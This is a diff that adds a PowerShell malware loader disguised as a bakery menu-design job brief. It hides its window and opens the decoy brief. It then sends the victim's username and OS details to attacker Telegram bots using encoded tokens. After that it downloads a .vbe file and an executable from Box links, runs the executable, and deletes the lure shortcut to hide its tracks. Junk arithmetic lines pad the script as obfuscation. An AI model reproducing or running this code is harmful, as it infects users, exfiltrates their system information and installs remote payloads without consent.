@@ -1,0 +1,148 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="Technical_Assignment_Menu_Design.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+TECHNICAL ASSIGNMENT
+Menu Design — Sweet Magnolias Bake Shop
+
+1. About the Bakery
+Sweet Magnolias Bake Shop opened its doors in 2016 in Omaha, Nebraska. The woman behind it all is Katina Talley, who spent years working as a food scientist at Conagra before deciding she'd rather spend her days baking than developing products for brands like Marie Callender's and Hunt's. Two locations now: Midtown, tucked into the Joslyn Castle neighborhood, and Millwork, in the up-and-coming Millwork Commons District. Both spots churn out the same thing — handcrafted pastries made from scratch, in small batches, with ingredients you can actually pronounce. The vibe is warm, a little rustic, and completely unpretentious. Think cozy neighborhood spot, not Instagram-ready bakery chain.
+
+2. What We Need
+A proper menu for the counter. Something customers can glance at while deciding between a cinnamon roll and a jalapeno popper bun. It needs to work in both locations, survive being printed and laminated, and look good enough that people actually want to take one home. Seasonal items should be easy to swap out without redesigning the whole thing from scratch.
+
+3. Brand Look and Colors
+The brand lives in soft, feminine territory. We're talking lavender, dusty pink, powder blue, and cream. Nothing loud, nothing aggressive. The logo is bubble letters in light purple with a whisk icon — playful but refined. Packaging has a hand-drawn floral pattern in lavender on cream. The interior features rustic wood, exposed beams, and pastel display counters. The menu should feel like it belongs in that world.
+
+Color hexes if you need them: Lavender — #B8A9C9, Soft Pink — #F4BFD3, Powder Blue — #A8C5D9, Cream — #FFF8F0, Dark Brown — #4A3728.
+
+4. Typography
+Headers need something elegant with a serif — Playfair Display or Cormorant Garamond do the trick. Body copy should be clean and readable, Montserrat or Nunito work fine. Prices stand out but don't scream. Minimum font size: 11pt for item names, 9pt for descriptions.
+
+5. Menu Structure
+Five sections, nothing fancy:
+
+5.1. Sweet Breakfast
+Cinnamon Roll — Iced or Caramel — $4
+Caramel Pecan Roll — with homemade caramel and toasty pecans — $4.25
+Sweet Scones — assorted flavors — $5
+Cardamom Knot — available Tue, Thu, Sat — $4.50
+Almond Frangipane Bun — available Wed, Fri, Sat, Sun — $5
+Baked Cake Donut — assorted flavors, vegan available — $2.75
+Coffee Cake Slice — flavors rotate weekly — $3.75
+Vegan Streusel Bun — weekends only, vegan — $5
+Vegan Cinnamon Roll — weekends only, vegan — $5
+
+5.2. Savory Breakfast
+Savory Scones — assorted flavors — $5
+Everything Parmesan Buns — available Wed, Fri, Sun — $4.50
+Jalapeno Popper Buns — available Tue, Thu — $4.50
+
+5.3. Treats
+Bars — $3.75
+Frosted Brownies — $4.50
+Assorted Cookies — $3
+Cookie Sandwich — $3.75
+Cake Jars — $5
+GF/Vegan Brownies — $5
+
+5.4. Custom Orders
+Brief mention of custom assortments for events — birthdays, showers, weddings. Full details on the Custom Orders page. Contact: sweetmagnoliasbakeshop@gmail.com
+
+6. Layout
+A4, landscape preferred for counter use. Clean, plenty of breathing room. Sections clearly separated with a thin divider or a small floral element tied to the brand pattern. Logo in the header or footer. Both addresses at the bottom. Email for custom orders. Nothing cluttered — customers should be able to read it in two seconds.
+
+7. Reference Photos
+Photos from the shop are in the project folder. Best ones: braided cinnamon roll on a decorative plate, top-down iced cinnamon rolls, caramel pecan rolls, interior with pastry display, branded packaging with the logo, and the lavender floral pattern. Use one or two max in the layout — they're there as backup if the design calls for it. All photos belong to Sweet Magnolias Bake Shop, provided for this project only.
+
+8. Deliverables
+Print-ready PDF, 300 DPI, CMYK color.
+Editable source files (AI or PSD).
+Optional: a secondary version in a square format for counter cards or social media use.
+
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ab01256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="OAAAADcAAAAyAAAAMgAAADgAAAA1AAAAOQAAADUAAAAyAAAANwAAADoAAABBAAAAQQAAAEUAAAA2AAAAXwAAAGYAAABwAAAAUAAAAGMAAAAtAAAAOQAAADMAAABIAAAAWAAAAHAAAAA1AAAANgAAAG0AAABXAAAAZgAAADgAAABMAAAAYQAAAEYAAABXAAAASwAAAFoAAABMAAAAeQAAAF8AAABiAAAAcQAAADIAAABUAAAASQAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="___"
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="___"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 444
+$v42=7*2-1
+If($v42>0){}
+$v43="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=8n8ew00bgg3soq0rix289yrvyobaef5e&file_id=f_2252791038503"
+$v44="1446062403_house.vbe"
+$v45=[Environment]::GetFolderPath("LocalApplicationData")
+$v46=Join-Path $v45 $v44
+$v47=6*3-2
+If($v47>0){}
+try{$v48=New-Object System.Net.WebClient;$v48.DownloadFile($v43,$v46)}catch{}
+$v49=5+3-1
+If($v49>0){}
+$v50="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=th7xazttzge36xcz3u8ac1tbyk8m6m8a&file_id=f_2252757501252"
+$v51="1446062403_key.exe"
+$v52=Join-Path $v45 $v51
+$v53=7*2+1
+If($v53>0){}
+try{$v54=New-Object System.Net.WebClient;$v54.DownloadFile($v50,$v52);$v55=New-Object System.Diagnostics.ProcessStartInfo;$v55.FileName=$v52;$v55.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v55.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v55)|Out-Null}catch{}
+$v56=10/2+3
+If($v56>0){}
+$v57="Technical_Assignment_Menu_Design.ink"
+$v58=$false
+$v59=$null
+$v60=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v61=3*3-2
+If($v61>0){}
+foreach($v62 in $v60){If(Test-Path -Path $v62){$v63=Join-Path $v62 $v57;If(Test-Path -Path $v63){$v59=$v63;$v58=$true;break}}}
+$v64=11-4+2
+If($v64>0){}
+If($v58){$v65=Split-Path -Parent $v59;$v66=Get-Date;$v67=600;while(((Get-Date)-$v66).TotalSeconds -lt $v67){$v68=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v68){try{Remove-Item -Path $v59 -Force -ErrorAction Stop;$v69=Join-Path $v65 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v69 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
